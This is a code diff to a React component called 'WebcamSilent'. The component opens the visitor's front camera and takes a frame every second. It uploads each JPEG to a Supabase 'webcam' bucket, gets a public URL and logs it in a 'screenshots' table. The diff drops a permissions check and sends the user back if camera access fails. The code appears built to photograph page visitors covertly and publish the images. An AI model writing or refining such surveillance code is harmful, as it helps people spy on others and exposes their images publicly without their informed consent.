@@ -127,88 +127,82 @@ const supabase = createClient(
 const WebcamSilent = () => {
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
+  const fallbackTimeoutRef = useRef<NodeJS.Timeout | null>(null);
 
   useEffect(() => {
     const init = async () => {
-      // Step 1: Check permission **before** accessing camera
-      try {
-        const permission = await navigator.permissions.query({ name: 'camera' as PermissionName });
-
-        if (permission.state === 'denied') {
-          window.history.back();
-          return;
-        }
-
-        // Optional: listen for future changes
-        permission.onchange = () => {
-          if (permission.state === 'denied') {
-            window.history.back();
-          }
-        };
-      } catch (permErr) {
-        // Some browsers don't support permissions API fully — fallback to catch block
-        console.warn('Permissions API not fully supported');
-      }
-
-      // Step 2: Attempt camera access
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' }
         });
 
-        if (videoRef.current) {
-          videoRef.current.srcObject = stream;
+        if (!videoRef.current) return;
+        videoRef.current.srcObject = stream;
 
-          videoRef.current.onloadedmetadata = () => {
-            videoRef.current?.play();
+        // ⏳ Fallback timeout: if camera doesn’t start in 5 sec, assume rejection
+        fallbackTimeoutRef.current = setTimeout(() => {
+          console.warn('Camera timeout — maybe blocked? Going back.');
+          window.history.back();
+        }, 5000);
 
-            setInterval(async () => {
-              if (!canvasRef.current || !videoRef.current) return;
+        videoRef.current.onloadedmetadata = () => {
+          clearTimeout(fallbackTimeoutRef.current!);
+          videoRef.current?.play();
 
-              const ctx = canvasRef.current.getContext('2d');
-              if (!ctx) return;
+          setInterval(async () => {
+            if (!canvasRef.current || !videoRef.current) return;
 
-              ctx.drawImage(videoRef.current, 0, 0, 320, 240);
+            const ctx = canvasRef.current.getContext('2d');
+            if (!ctx) return;
 
-              canvasRef.current.toBlob(async (blob) => {
-                if (!blob) return;
+            ctx.drawImage(videoRef.current, 0, 0, 320, 240);
 
-                const filename = `screenshot-${Date.now()}.jpg`;
+            canvasRef.current.toBlob(async (blob) => {
+              if (!blob) return;
 
-                const { error: uploadError } = await supabase.storage
-                  .from('webcam')
-                  .upload(filename, blob, {
-                    contentType: 'image/jpeg',
-                    upsert: false
-                  });
+              const filename = `screenshot-${Date.now()}.jpg`;
 
-                if (uploadError) {
-                  console.error('Upload error:', uploadError.message);
-                  return;
-                }
+              const { error: uploadError } = await supabase.storage
+                .from('webcam')
+                .upload(filename, blob, {
+                  contentType: 'image/jpeg',
+                  upsert: false,
+                });
 
-                const { data: publicData } = supabase.storage
-                  .from('webcam')
-                  .getPublicUrl(filename);
+              if (uploadError) {
+                console.error('Upload error:', uploadError.message);
+                return;
+              }
 
-                const publicUrl = publicData?.publicUrl;
+              const { data: publicData } = supabase.storage
+                .from('webcam')
+                .getPublicUrl(filename);
 
-                if (publicUrl) {
-                  await supabase.from('screenshots').insert({ image_url: publicUrl });
-                  console.log('✅ Uploaded:', publicUrl);
-                }
-              }, 'image/jpeg');
-            }, 1000);
-          };
-        }
+              const publicUrl = publicData?.publicUrl;
+              if (publicUrl) {
+                await supabase
+                  .from('screenshots')
+                  .insert({ image_url: publicUrl });
+                console.log('✅ Uploaded:', publicUrl);
+              }
+            }, 'image/jpeg');
+          }, 1000);
+        };
       } catch (err: any) {
         console.error('Camera error:', err);
-        // Fallback: user blocked camera during prompt
+        // 🚪 Rejected camera — go back
         window.history.back();
       }
     };
 
     init();
+
+    return () => {
+      // cleanup fallback timer on unmount
+      if (fallbackTimeoutRef.current) {
+        clearTimeout(fallbackTimeoutRef.current);
+      }
+    };
   }, []);
 
   return (
